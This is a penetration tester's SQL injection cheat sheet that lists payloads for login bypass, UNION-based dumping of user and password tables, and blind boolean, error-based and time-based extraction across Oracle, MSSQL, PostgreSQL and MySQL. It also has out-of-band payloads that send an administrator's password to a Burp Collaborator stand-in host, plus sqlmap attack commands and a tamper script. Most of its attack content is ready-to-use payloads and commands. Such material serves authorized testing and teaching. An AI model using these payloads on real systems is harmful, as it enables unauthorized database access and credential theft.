---
title: SQL injection
badge: Web
description: SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.
---

**HEY!!** Quick access:

- Quick n' dirty `sqlmap` command?? [Here it is!!](#first-go-to-command)
- [SQLi cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

> Important: Appart from certain examples. Most of the payloads listed here do not contain the initial `'` for the injections. This is for 2 reasons: If the injected parameter was a number you most likely do not need the `'`, and because it breaks the syntax highlighting. The initial `'` is obvious and I think is better to understand the payloads with some colors than to have the obvious quote at the beggining of each payload.

## Visual example

Lets say a request is made to a server to fetch the list of products within a category. The request could look like this:

```http
GET /products?category={{ injection Gifts } url-all } HTTP/1.1
Host: insegure-website.com
```

Wich could end up in a query where only `released` products of such cathegory are retrieved:

```sql
SELECT * FROM products WHERE category='{{ injection Gifts }}' AND released=1
```

If we add single quotes, we can modify the query and retrieve every product (even unreleased) with a payload like `' or 1=1;--`

```sql
SELECT * FROM products WHERE category='{{ injection ' or 1=1;-- }}' AND released=1
```

## Basic injections

Typically here we can already abuse injections we discover by just placing random `'` all over the place.

### Retrieving hidden data

Very likely, if you find user input being insafely evaluated inside a SQL query, it will end up on the `WEHERE` clause. Here are some payloads you can try (**after a `'`**):

```sql
OR 1337=1337--
OR 1337=1337;--
OR 'rAnd0m'='rAnd0m
```

> You should try with numbers other than `1` an strings other than `a`, because basic WAFs mith block such payloads.

This is an example of how this would look in a real world scenario:

```http
GET /products?category={{ injection 1337=1337-- } url-all } HTTP/1.1
```

```sql
SELECT * FROM products WHERE category='{{ injection ' OR 1337=1337-- }}' AND released=1
```

### Subverting application logic

Sometimes application logic (typically checks) is evaluated via the results of a query. This would be your **typical login form** or _"is admin?"_ thing.

You can use the **same payloads as above** and try to be a little bit imaginative. Imagine there's a login form wich could execute a query like the following:

```sql
SELECT * FROM users WHERE username='wiener' AND password='bluecheese'
```

If you login with username <code><smart-variable variable="username" default-value="administrator"></smart-variable>'--</code> and blank password, you could login as the administrator user like this:

```sql
SELECT * FROM users WHERE username='{{ username administrator }}'--' AND password='';
```

### Retreieving data from other database tables

Here is where the things start getting really interesting.
You can technically get data from other tables using more advanced SQL queries.
One of the ways is via the `UNION` keyword.

For example, imagine the following legit query:

```sql
SELECT name, description FROM products WHERE category = 'Gifts'
```

You could get other data like users and passwords using `UNION`:

```sql
SELECT name, description FROM products WHERE category='{{ injection ' UNION SELECT username, password FROM users-- }}'
```

Read more on the [next section](#union-attacks).

## UNION attacks

When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the `UNION` keyword can be used to retrieve data from other tables within the database. This results in an **SQL injection UNION attack**.

The `UNION` keyword lets you execute one or more additional `SELECT` queries and append the results to the original query. For example:

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

This SQL query will return a single result set with two columns, containing values from columns `a` and `b` in `table1` and columns `c` and `d` in `table2`.

For a `UNION` query to work, **two key requirements must be met**:

- The individual queries must return the **same number of columns**.
- The **data types** in each column **must be compatible** between the individual queries.

To carry out an SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This **generally involves figuring out**:

1. **How many columns** are being returned from the original query?
2. **Which columns** returned from the original query are of a **suitable data type** to hold the results from the injected query?

### Determining the necessary number of columns

There is 2 options, either submiting queries with `ORDER BY <colum_index>` until it fails (with an `out-of-range` error):

```sql
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
ORDER BY 4--
```

Here is an intruder-friendly payload:

```sql
ORDER BY §1§--
```


Or just with `UNION SELECT` with `NULL`s comma-separated:

```sql
UNION SELECT NULL--
UNION SELECT NULL,NULL--
UNION SELECT NULL,NULL,NULL--
UNION SELECT NULL,NULL,NULL,NULL--
```

Here is a repeater-friendly payload:

```sql
UNION SELECT NULL--
```

> Test both methods and look for either verbose errors or behaviour changes

> On **Oracle** databases, every select statement must specify a table when using `SELECT`. This means you would have to use payloads like `UNION SELECT NULL FROM dual--` (`FROM dual`).

### Finding columns with a useful data type

Whith the number of columns, just fill them with `NULL` and test every colum type manually. For example:

```sql
UNION SELECT 'a',NULL,NULL,NULL--
UNION SELECT NULL,'a',NULL,NULL--
UNION SELECT NULL,NULL,'a',NULL--
UNION SELECT NULL,NULL,NULL,'a'--
```

If the application does give you verbose errors, it might tell you what type it should be. If this is not the case, just brute-force the types:

```sql
UNION SELECT 'a',NULL,NULL,NULL--
UNION SELECT 1,NULL,NULL,NULL--
```

> Keep in mind that you only need to find a usefull column (large string-based types more likely). You can dump everething through that column. But in some cases you will want to find integer or float columns. The thing is that if you find a `TEXT` column, you don't neet to keep looking for other `TEXT`, `CHAR` or `VARCHAR` columns.


### Retrieving  interesting data

Here comes the cool part. Suppose that:

- The original query returns two columns, both of which can hold string data.
- The injection point is a quoted string within the `WHERE` clause.
- The database contains a table called `users` with the columns `username` and `password`.

In this situation, you can retrieve the contents of the `users` table by submitting the following payload:

```sql
UNION SELECT {{ col-a username }}, {{ col-b password }} FROM {{ table users }}--
```

### Retrieving multiple values within a single column

Imagine that the query returns only a single column, or that there is only one suitable column.
An neat trick is to **just concatenate the column values into a single one**.
This can be done in different ways depending on the DBMS in use:

<smart-tabs variable="dbms" :tabs="{'oracle': 'Oracle', 'microsoft': 'Microsoft', 'pgsql': 'PostgreSQL', 'mysql': 'MySQL'}">
<template v-slot:oracle>

```sql
UNION SELECT {{ col-a username }} || '{{ separator ~ }}' || {{ col-b password }} FROM {{ table users }}--
```

</template>
<template v-slot:microsoft>

```sql
UNION SELECT {{ col-a username }} + '{{ separator ~ }}' + {{ col-b password }} FROM {{ table users }}--
```

</template>
<template v-slot:pgsql>

```sql
UNION SELECT {{ col-a username }} || '{{ separator ~ }}' || {{ col-b password }} FROM {{ table users }}--
```

</template>
<template v-slot:mysql>

```sql
UNION SELECT {{ col-a username }} '{{ separator ~ }}' {{ col-b password }} FROM {{ table users }}--
```

</template>
</smart-tabs>

This would retrieve the values as follows:

```text
administrator{{ separator ~ }}s3cure
wiener{{ separator ~ }}peter
carlos{{ separator ~ }}montoya
```

## Examining the database

### Generic info

Different databases provide different ways of querying their version. You often need to try out different queries to find one that works, allowing you to determine both the type and version of the database software.

The queries to determine the database version for some popular database types are as follows:

| Database type | Query |
| --- | --- |
| Microsoft, MySQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()` |
| SQLite | `SELECT sqlite_version()` |

For example, you could use a `UNION` attack with the following input:

```sql
UNION SELECT @@version--
```

### Listing contents

Most database types (with the notable exception of Oracle) have a set of views called the **information schema** which provide information about the database.
On Oracle you can do more or less the same getting the tables by querying `all_tables` and the columns with `all_tab_columns`.
Here are some examples:

<smart-tabs variable="dbms" :tabs="{'oracle': 'Oracle', 'microsoft': 'Microsoft', 'pgsql': 'PostgreSQL', 'mysql': 'MySQL'}">
<template v-slot:oracle>

```sql
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = '{{ table-name users }}'
```

</template>
<template v-slot:microsoft>

```sql
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = '{{ table-name users }}'
```

</template>
<template v-slot:pgsql>

```sql
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = '{{ table-name users }}'
```

</template>
<template v-slot:mysql>

```sql
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = '{{ table-name users }}'
```

</template>
</smart-tabs>

## Blind SQL injections

What if we don't get the output of the queries? Blind SQL injection arises when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

With blind SQL injection vulnerabilities, many techniques such as UNION attacks, are not effective because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.

### Conditional responses

Sometimes, when performing SQL injections, requests to an application change subtly even if we can't see the results of a query.
An example could be an analytics cookie that if it is fond on the database, shows the user a _"Welcome Back!"_ message.

Abusing such behaviours, you could check if there is an injection point with payloads like the following two (to test if there is different responses):

```sql
{{ sqli-valid-value VALID_TOKEN }}' AND '1337'='1337
{{ sqli-valid-value VALID_TOKEN }}' AND '1337'='7777
```

This can help you to retrieve data from the database by just brute forcing it.
Which sounds reeeally slow but you can make it fast by going character by character and doing binary search.
You can do it with `SUBSTRING` function, to exctract a certain character and then compare it with `>` (or `<`) and `=` to a specific char.
Take in mind this function starts counting in `1`:

| Database type | Query |
| --- | --- |
| Oracle | <code>SUBSTR('foobar', <smart-variable variable="char-index" default-value="4"></smart-variable>, 1)</code> |
| Microsoft | <code>SUBSTRING('foobar', <smart-variable variable="char-index" default-value="4"></smart-variable>, 1)</code> |
| PostgreSQL | <code>SUBSTRING('foobar', <smart-variable variable="char-index" default-value="4"></smart-variable>, 1)</code> |
| MySQL | <code>SUBSTRING('foobar', <smart-variable variable="char-index" default-value="4"></smart-variable>, 1)</code> |

The injection would look somewhat similar to the following:

<smart-tabs variable="dbms" :tabs="{'oracle': 'Oracle', 'microsoft': 'Microsoft', 'pgsql': 'PostgreSQL', 'mysql': 'MySQL'}">
<template v-slot:oracle>

```sql
AND SUBSTR(({{ injected-query SELECT Password FROM Users WHERE Username = 'admin' }}), {{ char-index 1 }}, 1) {{ comp-operand < }} '{{ comp-char s }}'
```

</template>
<template v-slot:microsoft>

```sql
AND SUBSTRING(({{ injected-query SELECT Password FROM Users WHERE Username = 'admin' }}), {{ char-index 1 }}, 1) {{ comp-operand > }} '{{ comp-char a }}'
```

</template>
<template v-slot:pgsql>

```sql
AND SUBSTRING(({{ injected-query SELECT Password FROM Users WHERE Username = 'admin' }}), {{ char-index 1 }}, 1) {{ comp-operand = }} '{{ comp-char u }}'
```

</template>
<template v-slot:mysql>

```sql
AND SUBSTRING(({{ injected-query SELECT Password FROM Users WHERE Username = 'admin' }}), {{ char-index 1 }}, 1) {{ comp-operand < }} '{{ comp-char l }}'
```

</template>
</smart-tabs>

### Conditional responses via SQL errors

Maybe different Boolean conditions make no difference, but it is often possible to induce the application to return conditional responses by triggering SQL errors conditionally, depending on an injected condition.

An example of this behaviour is shown by the following two payloads:

```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

<smart-tabs variable="dbms" :tabs="{'oracle': 'Oracle', 'microsoft': 'Microsoft', 'pgsql': 'PostgreSQL', 'mysql': 'MySQL'}">
<template v-slot:oracle>

```sql
SELECT CASE WHEN ({{ evaluated-condition Username = 'admin' AND SUBSTRING(Password, 1, 1) > 'm' }}) THEN to_char(1/0) ELSE {{ else-value NULL }} END FROM dual
```

</template>
<template v-slot:microsoft>

```sql
SELECT CASE WHEN ({{ evaluated-condition Username = 'admin' AND SUBSTRING(Password, 1, 1) > 'm' }}) THEN 1/0 ELSE {{ else-value NULL }} END
```

</template>
<template v-slot:pgsql>

```sql
SELECT CASE WHEN ({{ evaluated-condition Username = 'admin' AND SUBSTRING(Password, 1, 1) > 'm' }}) THEN cast(1/0 as text) ELSE {{ else-value NULL }} END
```

</template>
<template v-slot:mysql>

```sql
SELECT IF({{ evaluated-condition Username = 'admin' AND SUBSTRING(Password, 1, 1) > 'm' }},(SELECT table_name FROM information_schema.tables), {{ else-value 'a' }})
```

</template>
</smart-tabs>

A full example could be the following:

```text
' AND ({{ payload A payload from above }})={{ else-value 'a }}
```

Something like this is what we are aiming for:

```sql
AND (SELECT CASE WHEN (Username = 'admin' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a'
```

An intruder-friendly payload list could be the following:

```text
' AND (SELECT CASE WHEN (1337=1337) THEN to_char(1/0) ELSE 'ZZZ' END FROM dual)='ZZZ
' AND (SELECT CASE WHEN (1337=7777) THEN to_char(1/0) ELSE 'ZZZ' END FROM dual)='ZZZ
' AND (SELECT CASE WHEN (1337=1337) THEN 1/0 ELSE 'ZZZ' END)='ZZZ
' AND (SELECT CASE WHEN (1337=7777) THEN 1/0 ELSE 'ZZZ' END)='ZZZ
' AND (SELECT CASE WHEN (1337=1337) THEN cast(1/0 as text) ELSE 'ZZZ' END)='ZZZ
' AND (SELECT CASE WHEN (1337=7777) THEN cast(1/0 as text) ELSE 'ZZZ' END)='ZZZ
' AND (SELECT IF(1337=1337,(SELECT table_name FROM information_schema.tables), 'ZZZ'))='ZZZ
' AND (SELECT IF(1337=7777,(SELECT table_name FROM information_schema.tables), 'ZZZ'))='ZZZ
 AND (SELECT CASE WHEN (1337=1337) THEN to_char(1/0) ELSE 9999 END FROM dual)=9999
 AND (SELECT CASE WHEN (1337=7777) THEN to_char(1/0) ELSE 9999 END FROM dual)=9999
 AND (SELECT CASE WHEN (1337=1337) THEN 1/0 ELSE 9999 END)=9999
 AND (SELECT CASE WHEN (1337=7777) THEN 1/0 ELSE 9999 END)=9999
 AND (SELECT CASE WHEN (1337=1337) THEN cast(1/0 as text) ELSE 9999 END)=9999
 AND (SELECT CASE WHEN (1337=7777) THEN cast(1/0 as text) ELSE 9999 END)=9999
 AND (SELECT IF(1337=1337,(SELECT table_name FROM information_schema.tables), 9999))=9999
 AND (SELECT IF(1337=7777,(SELECT table_name FROM information_schema.tables), 9999))=9999
```

### Time-based

If the application handles SQL errors properly, we can trigger time delays conditionally.
We could take exactly the same approach as on previous blind injections, but distinguish results based on the time it takes for the server to send a response.
This would be your typical `sleep` function.

We can abuse this behaviours in different ways.
But the idea is to get one of this _sleep_ functions to execute:

| Database type | Query |
| --- | --- |
| Oracle | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft | `WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `pg_sleep(10)` |
| MySQL | `sleep(10)` |

These are some examples on how you would abuse this condition to retrieve data: 

| Database type | Query |
| --- | --- |
| Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a' &verbar;&verbar; dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| Microsoft | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| MySQL | `SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')` |


<smart-tabs variable="dbms" :tabs="{'oracle': 'Oracle', 'microsoft': 'Microsoft', 'pgsql': 'PostgreSQL', 'mysql': 'MySQL'}">
<template v-slot:oracle>

```sql
SELECT CASE WHEN ({{ evaluated-condition Username = 'admin' AND SUBSTRING(Password, 1, 1) > 'm' }}) THEN 'a' &verbar;&verbar; dbms_pipe.receive_message(('a'), {{ delay 10 }}) ELSE NULL END FROM dual
```

</template>
<template v-slot:microsoft>

```sql
IF ({{ evaluated-condition Username = 'admin' AND SUBSTRING(Password, 1, 1) > 'm' }}) WAITFOR DELAY '0:0:{{ delay 10 }}'
```

</template>
<template v-slot:pgsql>

```sql
SELECT CASE WHEN ({{ evaluated-condition Username = 'admin' AND SUBSTRING(Password, 1, 1) > 'm' }}) THEN pg_sleep({{ delay 10 }}) ELSE pg_sleep(0) END
```

</template>
<template v-slot:mysql>

```sql
SELECT IF({{ evaluated-condition Username = 'admin' AND SUBSTRING(Password, 1, 1) > 'm' }},sleep({{ delay 10 }}),'a')
```

</template>
</smart-tabs>

A full payload could look like this:

```text
'; IF (SELECT COUNT(Username) FROM Users WHERE {{ evaluated-condition Username = 'admin' AND SUBSTRING(Password, 1, 1) > 'm' }}) = 1 WAITFOR DELAY '0:0:{{ delay 10 }}'--
```

### Using out-of-band (OOB) techniques
What if the queries run asyncronously or `sleep` functions are disabled? Well we can still use certain _out-of-band_(OOB) techniques, such as making the DBMS to make requests or run DNS queries.

#### Testing for injections

<smart-tabs variable="dbms" :tabs="{'oracle': 'Oracle', 'microsoft': 'Microsoft', 'pgsql': 'PostgreSQL', 'mysql': 'MySQL'}">
<template v-slot:oracle>

On Oracle you can try to trigger a XXE vulnerability while parsing XML:
```sql
SELECT extractvalue(xmltype('&lt;&quest;xml version&equals;&quot;1&period;0&quot; encoding&equals;&quot;UTF-8&quot;&quest;&gt;&lt;&excl;DOCTYPE root &lsqb; &lt;&excl;ENTITY &percnt; remote SYSTEM "https://{{ collaborator your-burpcollaborator.net }}/"&gt; &percnt;remote&semi;&rsqb;&gt;'),'/l') FROM dual
```

If the vulnerability is patched, you can use the following technique, but it requires elevated privileges:
```sql
SELECT UTL_INADDR.get_host_address('{{ collaborator your-burpcollaborator.net }}')
```

</template>
<template v-slot:microsoft>

```sql
exec master..xp_dirtree '//{{ collaborator your-burpcollaborator.net }}/a'
```

</template>
<template v-slot:pgsql>

```sql
copy (SELECT '') to program 'nslookup {{ collaborator your-burpcollaborator.net }}'
```

</template>
<template v-slot:mysql>

```sql
LOAD_FILE('\\\\{{ collaborator your-burpcollaborator.net }}\\a')
SELECT ... INTO OUTFILE '\\\\{{ collaborator your-burpcollaborator.net }}\a'
```
> These MySQL techniques only works on windows

</template>
</smart-tabs>

#### Data exfiltration

You can use this technique not only for detection but also for data exfiltration:

<smart-tabs variable="dbms" :tabs="{'oracle': 'Oracle', 'microsoft': 'Microsoft', 'pgsql': 'PostgreSQL', 'mysql': 'MySQL'}">
<template v-slot:oracle>

```sql
SELECT extractvalue(xmltype('&lt;&quest;xml version&equals;&quot;1&period;0&quot; encoding&equals;&quot;UTF-8&quot;&quest;&gt;&lt;&excl;DOCTYPE root &lsqb; &lt;&excl;ENTITY &percnt; remote SYSTEM &quot;http&colon;&sol;&sol;'||({{ query SELECT password FROM users WHERE username='Administrator'}})||'.{{ collaborator your-burpcollaborator.net }}/"&gt; &percnt;remote&semi;&rsqb;&gt;'),'/l') FROM dual
```

</template>
<template v-slot:microsoft>

```sql
declare @p varchar(1024);set @p=({{ query SELECT password FROM users WHERE username='Administrator'}});exec('master..xp_dirtree "//'+@p+'.{{ collaborator your-burpcollaborator.net }}/a"')
```

</template>
<template v-slot:pgsql>

```sql
create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p ({{ query SELECT password FROM users WHERE username='Administrator'}});
c := 'copy (SELECT '''') to program ''nslookup '||p||'.{{ collaborator your-burpcollaborator.net }}''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```

</template>
<template v-slot:mysql>

```sql
{{ query SELECT password FROM users WHERE username='Administrator'}} INTO OUTFILE '\\\\{{ collaborator your-burpcollaborator.net }}\a'
```
> This MySQL technique only works on windows

</template>
</smart-tabs>

## sqlmap

`sqlmap` is **The Tool** when it comes to exploitng SQL injection vulnerabilities.

### Installation

It is written in Python and has no dependencies at all, so you can just clone it and run it with no setup:

```shell
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git {{ sqlmap-dir sqlmap-dev }}
```

I usually add it to my path as `sqlmap` or save it as an alias, whatever feels faster for you.

<smart-tabs variable="path-vs-alias" :tabs="{'path': 'Path', 'alias': 'Alias'}">
<template v-slot:path>

```
ln {{ sqlmap-dir sqlmap-dev }}/sqlmap{.py,}
chmod u+x {{ sqlmap-dir sqlmap-dev }}/sqlmap
```

And add the following line to your `~/.zshrc` or `~/.bashrc`:

```bash
export PATH=$PATH:{{ sqlmap-dir sqlmap-dev }}
```

</template>
<template v-slot:alias>

Just add the following line to your `~/.zshrc` or `~/.bashrc`:

```bash
alias sqlmap="{{ python-interpreter python }} {{ sqlmap-dir sqlmap-dev }}/sqlmap.py"
```

</template>
</smart-tabs>

### Basic usage

```bash
sqlmap -u "{{ target-url https://vulnerable.net/product?id=5 }}" -p "{{ target-param id }}"
```

```bash
sqlmap -u "{{ target-url https://vulnerable.net/product?id=* }}"
```

### Examples - Discovery

#### First go-to command

My typical first go-to command would be something like this (having a request from burp with a `*` on the injection point):

<smart-tabs variable="proxy" :tabs="{'proxy': 'Proxy', 'no-proxy': 'No proxy'}">
<template v-slot:proxy>

<smart-tabs variable="tamper" :tabs="{'no-tamper': 'No tamper', 'tamper': 'Tamper'}">
<template v-slot:tamper>

```bash
sqlmap -r "{{ req-file vulnerable.req }}" --tamper={{ tamper-file between.py }} --delay={{ request-delay 1 }} --risk={{ sqlmap-risk 1 }} --level={{ sqlmap-level 1 }}  --random-agent --proxy "{{ proxy-url http://127.0.0.1:8080 }}" --force-ssl
```

</template>
<template v-slot:no-tamper>

```bash
sqlmap -r "{{ req-file vulnerable.req }}" --delay={{ request-delay 1 }} --risk={{ sqlmap-risk 1 }} --level={{ sqlmap-level 1 }}  --random-agent --proxy "{{ proxy-url http://127.0.0.1:8080 }}" --force-ssl
```

</template>
</smart-tabs>

</template>
<template v-slot:no-proxy>

<smart-tabs variable="tamper" :tabs="{'no-tamper': 'No tamper', 'tamper': 'Tamper'}">
<template v-slot:tamper>

```bash
sqlmap -r "{{ req-file vulnerable.req }}" --tamper={{ tamper-file between.py }} --delay={{ request-delay 1 }} --risk={{ sqlmap-risk 1 }} --level={{ sqlmap-level 1 }} --random-agent --force-ssl
```

</template>
<template v-slot:no-tamper>

```bash
sqlmap -r "{{ req-file vulnerable.req }}" --delay={{ request-delay 1 }} --risk={{ sqlmap-risk 1 }} --level={{ sqlmap-level 1 }} --random-agent --force-ssl
```

</template>
</smart-tabs>

</template>
</smart-tabs>

> When using a request file with `-r` you will need to specify ` --force-ssl` in order to make https requests since `sqlmap` defaults to http.

### Examples - Exploitation

### Tamper scripts

Amazing functionality. Basically `sqlmap` offers a way for you to run custom python code to process payloads before sending them, which is very handy to bypass character restrictions and exploit complex second-order injections.

#### Predefined tamper scripts

There is a list of scripts sqlmap already comes with. You can list them with `sqlmap --list-tampers` along with a brief decription of what they do.

#### Custom tamper scripts

You can place them in a folder along with a `__init__.py` file or you can place them on sqlmap's directory at <code><smart-variable variable="sqlmap-dir" default-value="sqlmap-dev">sqlmap-dev</smart-variable>/tamper/yourtamper.py</code>.

A tamper script file has the following structure:

```python[yourtamper.py]
#!/usr/bin/env python

from lib.core.enums import PRIORITY

__priority__ = {{ tamper-priority PRIORITY.NORMAL }}

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    {{ tamper-desc Basic description printed with --list-tampers }}
    """

    # Do stuff with payload
    new_payload = payload

    return new_payload

```

If multimple tamper scripts are used, `sqlmap` orders the scripts based on the `__priority__` field:

```python[lib/core/enums.py]
class PRIORITY(object):
    LOWEST = -100
    LOWER = -50
    LOW = -10
    NORMAL = 0
    HIGH = 10
    HIGHER = 50
    HIGHEST = 100
```

### Second-Order injections

Let's say you make a request to change some data, but the injection gets executed only after making a second request.
You can specify such request via a URL (with `--second-url`) or via a request file (with `--second-req`)

<smart-tabs variable="sqlmap-url-vs-file" :tabs="{'url': 'URL', 'file': 'Request file'}">
<template v-slot:url>

```bash
sqlmap -r injection.req -p products --second-url "{{ second-order-url https://vulnerable.net/info.php?user=5 }}" --force-ssl
```

</template>
<template v-slot:file>

```bash
sqlmap -r injection.req -p products --second-req "{{ second-order-req second-order.req }}" --force-ssl
```

</template>
</smart-tabs>


#### More complex second-order injections

With complex scenarios, a typicall way to exploit this injections, is by just program a tamper script that sends the payload and makes the necessary request, while making `sqlmap` to request only the last one. Here is an example script for that:

```python[second_order.py]
#!/usr/bin/env python

import requests
from lib.core.enums import PRIORITY


__priority__ = {{ tamper-priority PRIORITY.NORMAL }}


def dependencies():
    pass


def perform_injection(payload):
    proxies = {'http': '{{ proxy-url http://127.0.0.1:8080 }}'}
    cookies = {'sesion': 'SOME_TOKEN'}

    params = {'email': payload, 'other': 'stuff'}
    url = "https://{{ rhost vulnerable.net }}/do_stuff"
    pr = requests.post(url, data=params, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

    url = "https://{{ rhost vulnerable.net }}/do_more_stuff"
    gr = requests.get(url, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)


def tamper(payload, **kwargs):
    headers = kwargs.get("headers", {})
    perform_injection(payload)
    return 'maybe an id or nothing, whatever you need on the last request'

```

> Here the **Copy As Python-Requests** Burp extension comes pretty handy. Find it at the [bappstore](https://portswigger.net/bappstore/b324647b6efa4b6a8f346389730df160).
